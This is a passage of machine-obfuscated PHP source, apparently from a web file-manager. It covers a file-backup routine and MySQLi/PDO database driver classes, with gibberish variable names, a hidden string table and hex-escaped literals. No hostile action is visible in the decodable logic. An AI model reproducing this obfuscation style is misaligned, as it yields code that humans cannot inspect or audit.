. $èı—Æ°°[811] . $Æ³¢ù‹Í . $èı—Æ°°[164]); write_log($á¨ìÆ º, $èı—Æ°°[788]); return !1; } } $Ñıø­í§ = new DbManage(); $…Ù®±¡¦ = $Ñıø­í§->getSqlFile(); if (!$…Ù®±¡¦[$èı—Æ°°[812]] || !$…Ù®±¡¦[$èı—Æ°°[13]]) { return !1; } IO::move($…Ù®±¡¦[$èı—Æ°°[812]], $Æ³¢ù‹Í); IO::move($…Ù®±¡¦[$èı—Æ°°[13]], $Æ³¢ù‹Í); $ÈæŠ‚Ó«->end(); $Œ¦‚Ö¬ = array($èı—Æ°°[813] => $£áıæÊ‘, $èı—Æ°°[814] => time()); Backup::set($Œ¦‚Ö¬); return !0; } private function backupPath($ÌŠúŞ°Ÿ) { $÷£ùÍ¦  =& $_SERVER[şÒÁøÒÄ]; $“›êñï = $ÌŠúŞ°Ÿ[$÷£ùÍ¦ [32]]; $÷Õ†û®Û = Model($÷£ùÍ¦ [778])->get($÷£ùÍ¦ [779]); $ôÄ¼· = substr(md5($÷£ùÍ¦ [780] . $÷Õ†û®Û . $“›êñï), 0, 8); return "\173\151\x6f\72{$ÌŠúŞ°Ÿ[$÷£ùÍ¦ [759]]}\x7d\57\x64\x61\164\141\x62\x61\x73\x65\57\x62\x61\143\x6b\165\x70\57" . $“›êñï . $÷£ùÍ¦ [11] . $ôÄ¼·; } private function tmpFilesPath() { $óº¢Éğ¢ =& $_SERVER[şÒÁøÒÄ]; $ğÔï÷Û• = TEMP_FILES; if ($GLOBALS[$óº¢Éğ¢[6]][$óº¢Éğ¢[89]][$óº¢Éğ¢[804]]) { $ğÔï÷Û• = $GLOBALS[$óº¢Éğ¢[6]][$óº¢Éğ¢[89]][$óº¢Éğ¢[804]]; if (!mk_dir($ğÔï÷Û•) || !is_writable($ğÔï÷Û•) || !IO::mkfile($ğÔï÷Û• . $óº¢Éğ¢[805])) { $ğÔï÷Û• = TEMP_FILES; } } return $ğÔï÷Û•; } } class BackupFile { public function __construct() { } public function index() { $’ÑÒåÄ = Backup::get(); $Ó¦âİíç = $’ÑÒåÄ[$_SERVER[şÒÁøÒÄ][293]][$_SERVER[şÒÁøÒÄ][200]][$_SERVER[şÒÁøÒÄ][468]]; $óÎşÎğú = array($_SERVER[şÒÁøÒÄ][469] => array($_SERVER[şÒÁøÒÄ][815], $Ó¦âİíç), $_SERVER[şÒÁøÒÄ][816] => array($_SERVER[şÒÁøÒÄ][331], $’ÑÒåÄ[$_SERVER[şÒÁøÒÄ][759]])); $æµî“¨ = (int) Model($_SERVER[şÒÁøÒÄ][797])->where($óÎşÎğú)->count($_SERVER[şÒÁøÒÄ][468]); $Ö–ÌÉÁƒ = (int) Model($_SERVER[şÒÁøÒÄ][797])->where($óÎşÎğú)->sum($_SERVER[şÒÁøÒÄ][76]); $‰İ‹õı = new TaskFileTransfer($_SERVER[şÒÁøÒÄ][817], $_SERVER[şÒÁøÒÄ][788], $æµî“¨, LNG($_SERVER[şÒÁøÒÄ][789]) . $_SERVER[şÒÁøÒÄ][790] . LNG($_SERVER[şÒÁøÒÄ][818])); $‰İ‹õı->task[$_SERVER[şÒÁøÒÄ][771]] = $Ö–ÌÉÁƒ; $ü¤Ñ±±ù = array($_SERVER[şÒÁøÒÄ][819] => $æµî“¨, $_SERVER[şÒÁøÒÄ][820] => $Ö–ÌÉÁƒ, $_SERVER[şÒÁøÒÄ][821] => time()); Backup::set($ü¤Ñ±±ù); $üöŞå¢Ö = !0; $û»¡µ®Ñ = $this->storeIds(); $”ÀĞÍë­ = 1; $¬Ÿ´ç”ä = 1000; $€•©ÇÖ… = $íÜşìïã = 0; $È™´æñå = array(); $ôò…ˆ¬œ = $©øş¼ê = 0; do { $ú¬†ñ = $_SERVER[şÒÁøÒÄ][822]; $ˆóÈ•¬ = Model($_SERVER[şÒÁøÒÄ][797])->where($óÎşÎğú)->field($ú¬†ñ)->order($_SERVER[şÒÁøÒÄ][823])->selectPage($¬Ÿ´ç”ä, $”ÀĞÍë­); $Á«ÒÅè˜ = !empty($ˆóÈ•¬[$_SERVER[şÒÁøÒÄ][369]]) ? $ˆóÈ•¬[$_SERVER[şÒÁøÒÄ][369]] : array(); foreach ($Á«ÒÅè˜ as $¬Û°È¶Å) { if (!$this->_fileExist($¬Û°È¶Å, $È™´æñå, $û»¡µ®Ñ)) { $æµî“¨ -= 1; $Ö–ÌÉÁƒ -= (int) $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][76]]; write_log("\x66\x69\154\x65\40\156\157\x74\x20\145\x78\x69\163\x74\56\x66\x69\154\x65\111\104\x3a{$¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][468]]}\x2c\x20\x70\141\164\150\x3a{$¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][84]]}", $_SERVER[şÒÁøÒÄ][824]); continue; } $íôĞ ¿¼ = $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][84]]; $Ê“¢”Õ = "\x7b\151\x6f\72{$’ÑÒåÄ[$_SERVER[şÒÁøÒÄ][759]]}\175" . substr($íôĞ ¿¼, strlen("\173\x69\x6f\x3a{$¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][825]]}\175")); if (IO::exist($Ê“¢”Õ)) { $‰İ‹õı->updateFileEnd($¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][32]], $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][76]]); } else { $Ê“¢”Õ = get_path_father($Ê“¢”Õ); IO::mkdir($Ê“¢”Õ); if (!IO::copy($íôĞ ¿¼, $Ê“¢”Õ, $_SERVER[şÒÁøÒÄ][826])) { write_log($_SERVER[şÒÁøÒÄ][827] . $íôĞ ¿¼ . $_SERVER[şÒÁøÒÄ][811] . $Ê“¢”Õ . $_SERVER[şÒÁøÒÄ][164], $_SERVER[şÒÁøÒÄ][788]); $üöŞå¢Ö = !1; break; } } $Ó¦âİíç = $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][468]]; $íÜşìïã += 1; $€•©ÇÖ… += $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][76]]; $©øş¼ê += 1; $ôò…ˆ¬œ += $¬Û°È¶Å[$_SERVER[şÒÁøÒÄ][76]]; if ($€•©ÇÖ… >= 1024 * 1024 * 100) { $ü¤Ñ±±ù = array($_SERVER[şÒÁøÒÄ][828] => $Ó¦âİíç, $_SERVER[şÒÁøÒÄ][829] => $©øş¼ê, $_SERVER[şÒÁøÒÄ][830] => $ôò…ˆ¬œ); Backup::set($ü¤Ñ±±ù); $€•©ÇÖ… = $íÜşìïã = 0; } } $í‹®¼Çş = count($Á«ÒÅè˜); $”ÀĞÍë­++; } while ($í‹®¼Çş == $¬Ÿ´ç”ä); $‰İ‹õı->end(); $ü¤Ñ±±ù = array($_SERVER[şÒÁøÒÄ][831] => 1, $_SERVER[şÒÁøÒÄ][769] => time(), $_SERVER[şÒÁøÒÄ][783] => 1, $_SERVER[şÒÁøÒÄ][828] => $Ó¦âİíç, $_SERVER[şÒÁøÒÄ][820] => $Ö–ÌÉÁƒ, $_SERVER[şÒÁøÒÄ][819] => $æµî“¨, $_SERVER[şÒÁøÒÄ][832] => time()); if ($íÜşìïã) { $ü¤Ñ±±ù[$_SERVER[şÒÁøÒÄ][829]] = $©øş¼ê; $ü¤Ñ±±ù[$_SERVER[şÒÁøÒÄ][830]] = $ôò…ˆ¬œ; } Backup::set($ü¤Ñ±±ù); $this->_fileFilter($È™´æñå); return !0; } private function _fileExist($¹ášÛ¤, &$àÚ‘ëõº, $Àúºú¿®) { $‚éÊüş =& $_SERVER[şÒÁøÒÄ]; $¨–÷àšÆ = $¹ášÛ¤[$‚éÊüş[84]]; if (in_array($¹ášÛ¤[$‚éÊüş[468]], $àÚ‘ëõº)) { return !1; } if (!in_array($¹ášÛ¤[$‚éÊüş[825]], $Àúºú¿®)) { return !1; } if (IO::exist($¨–÷àšÆ)) { return !0; } $Ã˜±‰Åƒ = get_path_father($¨–÷àšÆ); if (IO::exist($Ã˜±‰Åƒ)) { $àÚ‘ëõº[] = $¹ášÛ¤[$‚éÊüş[468]]; return !1; } $÷®üÆ–‘ = array($‚éÊüş[825] => $¹ášÛ¤[$‚éÊüş[825]], $‚éÊüş[84] => array($‚éÊüş[383], "{$Ã˜±‰Åƒ}\x25")); $ïñÌ‡®¼ = Model($‚éÊüş[797])->where($÷®üÆ–‘)->field($‚éÊüş[469])->select(); $àÚ‘ëõº = array_merge($àÚ‘ëõº, array_to_keyvalue($ïñÌ‡®¼, $‚éÊüş[12], $‚éÊüş[468])); return !1; } private function _fileFilter($¬êéâ«) { $Ğšğ¡€Ó =& $_SERVER[şÒÁøÒÄ]; if (empty($¬êéâ«)) { return; } $…š…È®… = array($Ğšğ¡€Ó[468] => array($Ğšğ¡€Ó[7], array_unique($¬êéâ«))); $¢àä”Öø = Model($Ğšğ¡€Ó[833])->where($…š…È®…)->field($Ğšğ¡€Ó[402])->select(); foreach ($¢àä”Öø as $ñé¯Ğîñ) { Model($Ğšğ¡€Ó[833])->remove($ñé¯Ğîñ[$Ğšğ¡€Ó[402]], !1); } } private function storeIds() { $Ôğ¦‚ñ¤ =& $_SERVER[şÒÁøÒÄ]; $£™Ó×¾ç = Model($Ôğ¦‚ñ¤[775])->listData(); $…İ³’‡ = array(); $ş€’ú´¬ = $GLOBALS[$Ôğ¦‚ñ¤[6]][$Ôğ¦‚ñ¤[89]][$Ôğ¦‚ñ¤[834]]; foreach ($£™Ó×¾ç as $‚ôˆù©) { $òäı­ñÔ = strtolower($‚ôˆù©[$Ôğ¦‚ñ¤[95]]); if (!isset($ş€’ú´¬[$òäı­ñÔ])) { continue; } $´ü·Èò = $Ôğ¦‚ñ¤[74] . (isset($ş€’ú´¬[$òäı­ñÔ]) ? $ş€’ú´¬[$òäı­ñÔ] : ucfirst($òäı­ñÔ)); if (!class_exists($´ü·Èò)) { continue; } $…İ³’‡[] = $‚ôˆù©[$Ôğ¦‚ñ¤[399]]; } return $…İ³’‡; } } goto cÃÍ¹†Ôâî; bÍíÅñÜœ–: class DbMysqli extends Db { public function __construct($õî‘¦ = '') { $ÁŞµùß‡ =& $_SERVER[şÒÁøÒÄ]; if (!extension_loaded($ÁŞµùß‡[925])) { think_exception(think_lang($ÁŞµùß‡[14]) . $ÁŞµùß‡[926]); } if (!empty($õî‘¦)) { $this->config = $õî‘¦; if (empty($this->config[$ÁŞµùß‡[17]])) { $this->config[$ÁŞµùß‡[17]] = $ÁŞµùß‡[12]; } } } public function connect($ŞÙÊÛø¶ = '', $ö¹€•“€ = 0) { $ÖÄü³¡ =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->linkID[$ö¹€•“€])) { if (empty($ŞÙÊÛø¶)) { $ŞÙÊÛø¶ = $this->config; } $this->linkID[$ö¹€•“€] = new mysqli($ŞÙÊÛø¶[$ÖÄü³¡[899]], $ŞÙÊÛø¶[$ÖÄü³¡[901]], $ŞÙÊÛø¶[$ÖÄü³¡[902]], $ŞÙÊÛø¶[$ÖÄü³¡[21]], $ŞÙÊÛø¶[$ÖÄü³¡[900]] ? intval($ŞÙÊÛø¶[$ÖÄü³¡[900]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ş®‡šïÎ = $this->linkID[$ö¹€•“€]->server_version; $this->linkID[$ö¹€•“€]->query($ÖÄü³¡[903] . think_config($ÖÄü³¡[904]) . $ÖÄü³¡[58]); if ($ş®‡šïÎ > $ÖÄü³¡[905]) { $this->linkID[$ö¹€•“€]->query($ÖÄü³¡[906]); } $this->connected = !0; if (1 != think_config($ÖÄü³¡[22])) { unset($this->config); } } return $this->linkID[$ö¹€•“€]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Éıú±¾×) { $Èºí™ì =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Éıú±¾×; if ($this->queryID) { $this->free(); } think_action_status($Èºí™ì[23], 1); think_status($Èºí™ì[24]); $this->queryID = $this->_linkID->query($Éıú±¾×); if ($this->_linkID->more_results()) { while (($úĞêŸŸ = $this->_linkID->next_result()) != NULL) { $úĞêŸŸ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÂÌªÌ ) { $œ’Ô˜„ı =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÂÌªÌ ; if ($this->queryID) { $this->free(); } think_action_status($œ’Ô˜„ı[25], 1); think_status($œ’Ô˜„ı[24]); $õªäË­à = $this->_linkID->query($ÂÌªÌ ); $this->debug(); if (!1 === $õªäË­à) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­“Ôş°Ç = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$­“Ôş°Ç) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ü¶ôÓ®¦ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ü¶ôÓ®¦) { $this->error(); return !1; } } return !0; } private function getAll() { $ö¹…“œõ = array(); if ($this->numRows > 0) { for ($…ÏÂÜ = 0; $…ÏÂÜ < $this->numRows; $…ÏÂÜ++) { $ö¹…“œõ[$…ÏÂÜ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ö¹…“œõ; } public function getFields($Ôğ¬ñÔÌ) { $ïÀ¦Ò‘¥ =& $_SERVER[şÒÁøÒÄ]; $†£‹†‰ç = $this->query($ïÀ¦Ò‘¥[910] . $this->parseKey($Ôğ¬ñÔÌ)); $Š˜ÀÒ•å = array(); if ($†£‹†‰ç) { foreach ($†£‹†‰ç as $ßš£¸®è => $´İóçá) { $Š˜ÀÒ•å[$´İóçá[$ïÀ¦Ò‘¥[31]]] = array($ïÀ¦Ò‘¥[32] => $´İóçá[$ïÀ¦Ò‘¥[31]], $ïÀ¦Ò‘¥[33] => $´İóçá[$ïÀ¦Ò‘¥[34]], $ïÀ¦Ò‘¥[35] => (bool) ($´İóçá[$ïÀ¦Ò‘¥[36]] === $ïÀ¦Ò‘¥[12]), $ïÀ¦Ò‘¥[37] => $´İóçá[$ïÀ¦Ò‘¥[38]], $ïÀ¦Ò‘¥[39] => strtolower($´İóçá[$ïÀ¦Ò‘¥[40]]) == $ïÀ¦Ò‘¥[41], $ïÀ¦Ò‘¥[42] => strtolower($´İóçá[$ïÀ¦Ò‘¥[43]]) == $ïÀ¦Ò‘¥[44]); } } return $Š˜ÀÒ•å; } public function getTables($¤á÷•‘ú = '') { $Ñ¢ØÈÖ³ =& $_SERVER[şÒÁøÒÄ]; $ê¤øşŠî = !empty($¤á÷•‘ú) ? $Ñ¢ØÈÖ³[912] . $¤á÷•‘ú . $Ñ¢ØÈÖ³[913] : $Ñ¢ØÈÖ³[914]; $ƒÈüßÁŸ = $this->query($ê¤øşŠî); $˜ßÁìâ¸ = array(); if ($ƒÈüßÁŸ) { foreach ($ƒÈüßÁŸ as $ºíƒº¢ => $ëµÄèºù) { $˜ßÁìâ¸[$ºíƒº¢] = current($ëµÄèºù); } } return $˜ßÁìâ¸; } public function replace($¯ì¶Á, $¬”ö¬Íš = array()) { $”µêªÖ =& $_SERVER[şÒÁøÒÄ]; foreach ($¯ì¶Á as $ÓÒ¤²ó¸ => $›·ó‡Ä²) { $êŒ½µ˜´ = $this->parseValue($›·ó‡Ä²); if (is_scalar($êŒ½µ˜´)) { $¤†ŒÃı¢[] = $êŒ½µ˜´; $÷Æ­ÆşÄ[] = $this->parseKey($ÓÒ¤²ó¸); } } $»ŠÃ–†½ = $”µêªÖ[915] . $this->parseTable($¬”ö¬Íš[$”µêªÖ[279]]) . $”µêªÖ[916] . implode($”µêªÖ[50], $÷Æ­ÆşÄ) . $”µêªÖ[917] . implode($”µêªÖ[50], $¤†ŒÃı¢) . $”µêªÖ[918]; return $this->execute($»ŠÃ–†½); } public function insertAll($ÍÁÜ£¨„, $ƒ´ÙÃæ‘ = array(), $· ŸôøŠ = false) { $Í²ßŠ© =& $_SERVER[şÒÁøÒÄ]; if (!is_array($ÍÁÜ£¨„[0])) { return !1; } $Ù¸ÄôÂ = array_keys($ÍÁÜ£¨„[0]); $¿úĞ† = array(); foreach ($ÍÁÜ£¨„ as $±éœ´) { $ºÂµû = array(); foreach ($±éœ´ as $’ÓÖ¶Ÿ… => $¾ÑÔÆßÅ) { $¾ÑÔÆßÅ = $this->parseValue($¾ÑÔÆßÅ); if (is_scalar($¾ÑÔÆßÅ)) { $ºÂµû[] = $¾ÑÔÆßÅ; } } $¿úĞ†[] = $Í²ßŠ©[260] . implode($Í²ßŠ©[50], $ºÂµû) . $Í²ßŠ©[918]; } array_walk($Ù¸ÄôÂ, array($this, $Í²ßŠ©[919])); $Œåñú— = $· ŸôøŠ ? $Í²ßŠ©[920] : $Í²ßŠ©[921]; $ÌúÄôˆ³ = $Œåñú— . $Í²ßŠ©[922] . $this->parseTable($ƒ´ÙÃæ‘[$Í²ßŠ©[279]]) . $Í²ßŠ©[916] . implode($Í²ßŠ©[50], $Ù¸ÄôÂ) . $Í²ßŠ©[923] . implode($Í²ßŠ©[50], $¿úĞ†); return $this->execute($ÌúÄôˆ³); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $£ûÕ¦ù… =& $_SERVER[şÒÁøÒÄ]; $this->error = $this->_linkID->errno . $£ûÕ¦ù…[4] . $this->_linkID->error; if ($£ûÕ¦ù…[12] != $this->queryStr) { $this->error .= LNG($£ûÕ¦ù…[48]) . $this->queryStr; } think_trace($this->error, $£ûÕ¦ù…[12], $£ûÕ¦ù…[49]); return $this->error; } public function escapeString($£ò“…õ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($£ò“…õ); } else { return addslashes($£ò“…õ); } } public function parseKey(&$Íû‚øâ, $š¸ÒÕóç = true) { $¨‹ö«™ =& $_SERVER[şÒÁøÒÄ]; if ($š¸ÒÕóç) { $Íû‚øâ = $this->parseKeyCheck($Íû‚øâ); } if ($Íû‚øâ != $¨‹ö«™[189] && !preg_match($¨‹ö«™[924], $Íû‚øâ)) { $Íû‚øâ = $¨‹ö«™[385] . trim($Íû‚øâ, $¨‹ö«™[385]) . $¨‹ö«™[385]; } return $Íû‚øâ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($æƒ©§ÎÜ = '') { $ûÆ‘œëë =& $_SERVER[şÒÁøÒÄ]; if (!class_exists($ûÆ‘œëë[927])) { think_exception(think_lang($ûÆ‘œëë[14]) . $ûÆ‘œëë[928]); } if (!empty($æƒ©§ÎÜ)) { $this->config = $æƒ©§ÎÜ; if (empty($this->config[$ûÆ‘œëë[17]])) { $this->config[$ûÆ‘œëë[17]] = array(); } } } public function connect($ó‘©¤¸ = '', $¾Å¹Û™ = 0) { $ßÀš°£¨ =& $_SERVER[şÒÁøÒÄ]; if (!isset($this->linkID[$¾Å¹Û™])) { if (empty($ó‘©¤¸)) { $ó‘©¤¸ = $this->config; } $ÍÉå“şŸ = !empty($ó‘©¤¸[$ßÀš°£¨[17]][$ßÀš°£¨[18]]) ? $ó‘©¤¸[$ßÀš°£¨[17]][$ßÀš°£¨[18]] : $this->pconnect; if ($ÍÉå“şŸ) { $ó‘©¤¸[$ßÀš°£¨[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¾Å¹Û™] = new PDO($ó‘©¤¸[$ßÀš°£¨[929]], $ó‘©¤¸[$ßÀš°£¨[901]], $ó‘©¤¸[$ßÀš°£¨[902]], $ó‘©¤¸[$ßÀš°£¨[17]]); } catch (PDOException $œŞüšÌÏ) { think_exception($œŞüšÌÏ->getMessage()); } $this->dbType = $this->_getDsnType($ó‘©¤¸[$ßÀš°£¨[929]]); if (in_array($this->dbType, array($ßÀš°£¨[930], $ßÀš°£¨[931], $ßÀš°£¨[932], $ßÀš°£¨[933]))) { think_exception($ßÀš°£¨[934] . $this->dbType . $ßÀš°£¨[935] . $this->dbType . $ßÀš°£¨[936]); } if (!$this->linkID[$¾Å¹Û™]) { think_exception($ßÀš°£¨[937]); } try { $this->linkID[$¾Å¹Û™]->exec($ßÀš°£¨[938] . think_config($ßÀš°£¨[904])); } catch (Exception $œŞüšÌÏ) { } $this->connected = !0; if (1 != think_config($ßÀš°£¨[22])) { unset($this->config); } } return $this->linkID[$¾Å¹Û™]; } public function free() { $this->PDOStatement = null; } public function query($Ïä¬¶¸, $úŠª¡ = array()) { $…¤ø =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ïä¬¶¸; if (!empty($úŠª¡)) { $this->queryStr .= $…¤ø[939] . print_r($úŠª¡, !0) . $…¤ø[940]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($…¤ø[23], 1); think_status($…¤ø[24]); $this->PDOStatement = $this->_linkID->prepare($Ïä¬¶¸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ªˆøéå = $this->PDOStatement->execute($úŠª¡); $this->debug(); if (!1 === $ªˆøéå) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($›µ¥ÉÊ¾, $›Î’­êÁ = array()) { $€»ÙÍÕÀ =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $›µ¥ÉÊ¾; if (!empty($›Î’­êÁ)) { $this->queryStr .= $€»ÙÍÕÀ[939] . print_r($›Î’­êÁ, !0) . $€»ÙÍÕÀ[940]; } $œÉ‘ÉöÎ = !1; if ($this->dbType == $€»ÙÍÕÀ[933]) { if (preg_match($€»ÙÍÕÀ[941], $this->queryStr, $ÅäÂªù›)) { $this->table = think_config($€»ÙÍÕÀ[942]) . str_ireplace(think_config($€»ÙÍÕÀ[943]), $€»ÙÍÕÀ[378], $ÅäÂªù›[2]); $œÉ‘ÉöÎ = (bool) $this->query($€»ÙÍÕÀ[944] . strtoupper($this->table) . $€»ÙÍÕÀ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€»ÙÍÕÀ[25], 1); think_status($€»ÙÍÕÀ[24]); $this->PDOStatement = $this->_linkID->prepare($›µ¥ÉÊ¾); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ş¨ÛÊÌ = $this->PDOStatement->execute($›Î’­êÁ); $this->debug(); if (!1 === $ş¨ÛÊÌ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($œÉ‘ÉöÎ || preg_match($€»ÙÍÕÀ[945], $›µ¥ÉÊ¾)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $“·´¶“ = $this->_linkID->commit(); $this->transTimes = 0; if (!$“·´¶“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $œ‚„­Ú· = $this->_linkID->rollback(); $this->transTimes = 0; if (!$œ‚„­Ú·) { $this->error(); return !1; } } return !0; } private function getAll() { $åĞñ…½ñ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($åĞñ…½ñ); return $åĞñ…½ñ; } public function getFields($çŸô®¶) { $„¸±ú„· =& $_SERVER[şÒÁøÒÄ]; $this->initConnect(!0); if (think_config($„¸±ú„·[946])) { $ÄàãôÎ± = str_replace($„¸±ú„·[947], $çŸô®¶, think_config($„¸±ú„·[946])); } else { switch ($this->dbType) { case $„¸±ú„·[930]: case $„¸±ú„·[948]: $ÄàãôÎ± = "\x53\105\x4c\105\x43\x54\x20\x20\40\x63\x6f\154\x75\x6d\156\137\x6e\141\x6d\x65\x20\x61\x73\40\x27\x4e\x61\155\x65\x27\54\40\x20\40\144\141\164\141\137\164\171\x70\x65\40\x61\x73\x20\47\x54\x79\x70\145\47\x2c\x20\40\40\143\157\154\x75\x6d\x6e\x5f\x64\x65\x66\141\165\154\x74\40\x61\x73\x20\x27\104\x65\146\141\x75\154\164\x27\54\40\40\40\x69\x73\137\156\x75\154\x6c\x61\x62\154\145\40\141\163\x20\x27\116\165\x6c\154\x27\xa\11\11\x46\x52\117\x4d\11\151\156\x66\157\162\x6d\141\164\x69\x6f\x6e\137\163\x63\x68\x65\x6d\x61\56\x74\x61\x62\154\x65\x73\40\x41\x53\40\x74\xa\11\11\112\117\111\116\11\x69\156\x66\157\x72\155\141\164\151\x6f\x6e\137\x73\143\150\x65\x6d\141\x2e\143\x6f\154\x75\155\156\x73\40\x41\123\40\143\12\x9\x9\x4f\x4e\40\x20\x74\x2e\164\x61\x62\x6c\x65\137\x63\141\x74\141\x6c\157\147\x20\x3d\40\143\56\164\x61\x62\154\145\x5f\x63\x61\x74\x61\x6c\157\147\xa\x9\x9\x41\116\x44\40\x74\x2e\x74\x61\x62\x6c\x65\137\163\x63\x68\x65\x6d\x61\40\x3d\x20\x63\56\x74\141\x62\154\145\x5f\x73\x63\x68\145\x6d\141\xa\11\11\x41\x4e\x44\40\x74\56\x74\141\142\154\x65\137\156\141\155\145\x20\x3d\40\x63\56\164\141\x62\154\145\137\x6e\141\x6d\145\xa\11\11\127\110\x45\122\105\x20\40\40\x74\56\164\x61\x62\154\x65\x5f\156\x61\155\x65\40\x3d\x20\47{$çŸô®¶}\47"; break; case $„¸±ú„·[949]: $ÄàãôÎ± = $„¸±ú„·[950] . $çŸô®¶ . $„¸±ú„·[951]; break; case $„¸±ú„·[931]: case $„¸±ú„·[933]: $ÄàãôÎ± = $„¸±ú„·[952] . $„¸±ú„·[953] . $„¸±ú„·[954] . strtoupper($çŸô®¶) . $„¸±ú„·[955] . strtoupper($çŸô®¶) . $„¸±ú„·[956]; break; case $„¸±ú„·[957]: $ÄàãôÎ± = $„¸±ú„·[958] . $çŸô®¶ . $„¸±ú„·[959]; break; case $„¸±ú„·[932]: break; case $„¸±ú„·[960]: default: $ÄàãôÎ± = $„¸±ú„·[961] . ($this->dbType == $„¸±ú„·[960] ? "\140{$çŸô®¶}\x60" : $çŸô®¶); } } $§Åç”Ïà = $this->query($ÄàãôÎ±); $Ûù€„â = array(); if ($§Åç”Ïà) { foreach ($§Åç”Ïà as $Ø¬‰Â· => $ÓŠ •ù) { $ÓŠ •ù = array_change_key_case($ÓŠ •ù); $ÓŠ •ù[$„¸±ú„·[32]] = isset($ÓŠ •ù[$„¸±ú„·[32]]) ? $ÓŠ •ù[$„¸±ú„·[32]] : $„¸±ú„·[378]; $ÓŠ •ù[$„¸±ú„·[33]] = isset($ÓŠ •ù[$„¸±ú„·[33]]) ? $ÓŠ •ù[$„¸±ú„·[33]] : $„¸±ú„·[378]; $¬Œş“¡µ = isset($ÓŠ •ù[$„¸±ú„·[273]]) ? $ÓŠ •ù[$„¸±ú„·[273]] : $ÓŠ •ù[$„¸±ú„·[32]]; $Ûù€„â[$¬Œş“¡µ] = array($„¸±ú„·[32] => $¬Œş“¡µ, $„¸±ú„·[33] => $ÓŠ •ù[$„¸±ú„·[33]], $„¸±ú„·[35] => (bool) (isset($ÓŠ •ù[$„¸±ú„·[103]]) && $ÓŠ •ù[$„¸±ú„·[103]] === $„¸±ú„·[12] || isset($ÓŠ •ù[$„¸±ú„·[35]]) && $ÓŠ •ù[$„¸±ú„·[35]] === $„¸±ú„·[12]), $„¸±ú„·[37] => isset($ÓŠ •ù[$„¸±ú„·[37]]) ? $ÓŠ •ù[$„¸±ú„·[37]] : (isset($ÓŠ •ù[$„¸±ú„·[56]]) ? $ÓŠ •ù[$„¸±ú„·[56]] : $„¸±ú„·[378]), $„¸±ú„·[39] => isset($ÓŠ •ù[$„¸±ú„·[94]]) ? strtolower($ÓŠ •ù[$„¸±ú„·[94]]) == $„¸±ú„·[41] : (isset($ÓŠ •ù[$„¸±ú„·[57]]) ? $ÓŠ •ù[$„¸±ú„·[57]] : !1), $„¸±ú„·[42] => isset($ÓŠ •ù[$„¸±ú„·[962]]) ? strtolower($ÓŠ •ù[$„¸±ú„·[962]]) == $„¸±ú„·[44] : (isset($ÓŠ •ù[$„¸±ú„·[94]]) ? $ÓŠ •ù[$„¸±ú„·[94]] : !1)); } } return $Ûù€„â; } public function getTables($¾Ğ˜›ÎÏ = '') { $ÁËØ ½Ì =& $_SERVER[şÒÁøÒÄ]; if (think_config($ÁËØ ½Ì[963])) { $®·Û‹¾ = str_replace($ÁËØ ½Ì[964], $¾Ğ˜›ÎÏ, think_config($ÁËØ ½Ì[963])); } else { switch ($this->dbType) { case $ÁËØ ½Ì[931]: case $ÁËØ ½Ì[933]: $®·Û‹¾ = $ÁËØ ½Ì[965]; break; case $ÁËØ ½Ì[930]: case $ÁËØ ½Ì[948]: $®·Û‹¾ = $ÁËØ ½Ì[966]; break; case $ÁËØ ½Ì[957]: $®·Û‹¾ = $ÁËØ ½Ì[967]; break; case $ÁËØ ½Ì[932]: think_exception(think_lang($ÁËØ ½Ì[968]) . $ÁËØ ½Ì[969]); break; case $ÁËØ ½Ì[949]: $®·Û‹¾ = $ÁËØ ½Ì[45] . $ÁËØ ½Ì[46] . $ÁËØ ½Ì[47]; break; case $ÁËØ ½Ì[960]: default: if (!empty($¾Ğ˜›ÎÏ)) { $®·Û‹¾ = $ÁËØ ½Ì[912] . 